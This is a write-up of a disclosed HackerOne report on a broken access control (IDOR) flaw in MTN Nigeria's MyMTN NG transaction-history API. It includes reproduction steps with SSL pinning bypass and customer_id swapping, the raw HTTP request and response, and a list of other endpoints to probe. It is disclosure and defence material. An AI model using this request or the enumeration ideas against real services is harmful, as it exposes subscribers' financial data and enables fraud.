# Broken Access Control in /v2/rechargeTransactionHistory Endpoint Allows Unauthorized Transaction History Disclosure

## Metadata
- **Source:** HackerOne
- **Report:** 2746709 | https://hackerone.com/reports/2746709
- **Submitted:** 2024-09-27
- **Reporter:** hafiz-ng
- **Program:** MyMTN NG (MTN Nigeria)
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** Broken Access Control, Insufficient Authorization, Insecure Direct Object Reference (IDOR), Information Disclosure
- **CVEs:** None
- **Category:** uncategorised

## Summary
The /api/v2/rechargeTransactionHistory endpoint fails to properly validate user authorization, allowing attackers to access transaction history of arbitrary MTN customers by modifying the customer_id parameter. This enables unauthorized disclosure of sensitive financial transaction details including recharge dates, account balances before/after transactions, and transaction identifiers for any MTN subscriber.

## Attack scenario
1. Attacker authenticates to MyMTN NG mobile application with valid credentials
2. Attacker intercepts API traffic using proxy tool (e.g., Burp Suite) and bypasses SSL pinning
3. Attacker navigates to transaction history section to observe the legitimate API request to /api/v2/rechargeTransactionHistory
4. Attacker modifies the customer_id parameter from their own MTN number to a target victim's MTN number
5. Backend API processes request without validating that authenticated user is authorized to access the specified customer_id
6. Attacker receives complete transaction history response containing victim's financial transaction data including dates, amounts, and transaction IDs

## Root cause
The API endpoint implements authentication (token-based via Authorization header) but lacks proper authorization checks to verify the authenticated user has legitimate access to the requested customer_id. The endpoint trusts the customer_id parameter directly from the request without validating it matches the authenticated user's identity or assigned permissions.

## Attacker mindset
An attacker recognizes that mobile apps often have weaker security controls than web platforms and that SSL pinning bypass techniques are well-documented. They understand that IDOR vulnerabilities are common in APIs and systematically test parameter manipulation. They see value in aggregating transaction data across multiple victims for financial fraud, social engineering, or selling datasets to other threat actors.

## Defensive takeaways
- Implement strict authorization checks on all API endpoints: verify authenticated user has explicit permission to access the specific resource (customer_id) being requested
- Use indirect references instead of direct object references; map customer_id to authenticated user context server-side
- Enforce multi-layer validation: authenticate user identity, verify user role/permissions, and validate requested resource ownership
- Log and monitor API requests for anomalies such as rapid customer_id parameter changes or requests from single user accessing multiple customer accounts
- Conduct security code reviews specifically targeting IDOR vulnerabilities in API endpoints that handle user-specific data
- Implement rate limiting and request throttling to prevent bulk enumeration of customer_id values
- Encrypt sensitive response data at rest and use field-level access controls in API responses
- Perform regular security testing including manual IDOR testing and automated authorization checks in SAST tools
- Educate development teams on secure API design patterns and the OWASP API Security Top 10

## Variant hunting
Test other user-specific endpoints for similar IDOR patterns: /api/v2/accountBalance, /api/v2/userProfile, /api/v2/paymentMethods
Attempt to access other customer data using sequential or enumerable identifiers (phone numbers, account IDs, subscription IDs)
Test parameter tampering on date range fields (start_date, end_date) to potentially access other users' historical data windows
Check if other API versions (/v1/, /v3/) have similar authorization flaws
Attempt to access transaction history for users in different regions/country codes to test authorization bypass across geo-boundaries
Test whether other sensitive endpoints accept customer_id as a parameter and bypass authorization similarly
Investigate if pagination parameters can be leveraged to retrieve data beyond intended results
Check for similar authorization bypasses in related endpoints: /api/v2/billingHistory, /api/v2/subscriptionDetails, /api/v2/serviceUsage

## MITRE ATT&CK
- T1190
- T1566
- T1589
- T1590
- T1592
- T1040
- T1041

## Notes
This is a classic IDOR vulnerability in a financial/telecom context with direct real-world impact. The presence of SSL pinning bypass requirement suggests the mobile app had some security considerations, but the backend authorization logic was completely absent. The vulnerability allows mass enumeration of MTN subscriber data, making it particularly valuable for threat actors. The response includes actionable financial transaction data that could facilitate fraud, identity theft, or account takeover attacks. The writeup demonstrates good security research methodology by showing exact requests/responses and clear reproduction steps.

## Full report
<details><summary>Expand</summary>

An API endpoint discovered on the MyMTN NG mobile app fails to adequately enforce authorization and authentication mechanisms. Essentially, it allows a bad actor to access the transaction history details for other victims which include `rechargeDate`,  `amountAfter`,  `amountBefore` and `transactionId` due to an insufficient authorization check. 

## Steps To Reproduce:
  1. Log into the **myMTN NG** mobile app.
  2. Set up your proxy tool to intercept the mobile API traffic and bypass the SSL pinning mechanism.
  3. Visit the **transaction history** section within the app and intercept the request with your proxy tool.
 4. Replace the `customer_id` field to any arbitrary MTN number to disclose transaction details of the victim.

## Supporting Material/References:
{█████████}

**Request to vulnerable endpoint**
```POST /api/v2/rechargeTransactionHistory HTTP/2
Host: ████████
Content-Type: application/json
Access-Control-Allow-Origin: *
Accept: application/json
Authorization: ██████
X-Country-Code: nga
Msisdn-Code: 234
Accept-Encoding: gzip, deflate, br
Accept-Language: en-us
Content-Length: 77
User-Agent: myMTN%20NG/14 CFNetwork/1220.1 Darwin/20.3.0

{"customer_id":"2347032233323","start_date":"██████████","end_date":"█████████"}
```

**Response**
```
{"sequenceNumber":"b5fb6af-bc59-57dd-a","data":[{"rechargeDate":"████","amountAfter":"878190.940000","adjustmentType":"RECHARGE","amountBefore":"828190.940000","subscriberId":"2347032233323","rechargeHistory":[{"payType":"VTU","rechargeAmount":"50000.0","description":"VTU"}],"transaction":"VTU"},{"rechargeDate":"███████","amountAfter":"828190.940000","adjustmentType":"RECHARGE","amountBefore":"778190.940000","subscriberId":"2347032233323","rechargeHistory":[{"payType":"VTU","rechargeAmount":"50000.0","description":"VTU"}],"transaction":"VTU"}],"transaction":"VTU"}],"success":true,"resultCode":"0000","links":[],"resultDescription":"Success","transactionId":"████████141033000481","status":200,"statusCode":200}```

## Impact

The potential impact this vulnerability may have on MTN NG can be summarized as follows:

- The impact of this exposure of PII can be devastating to your company, with fallout ranging from recovery costs to decreased customer trust. 
-  Attackers with access to this private information about a victim can use this information to carryout other nefarious activities.

</details>

---
*Analysed by Claude on 2026-05-24*
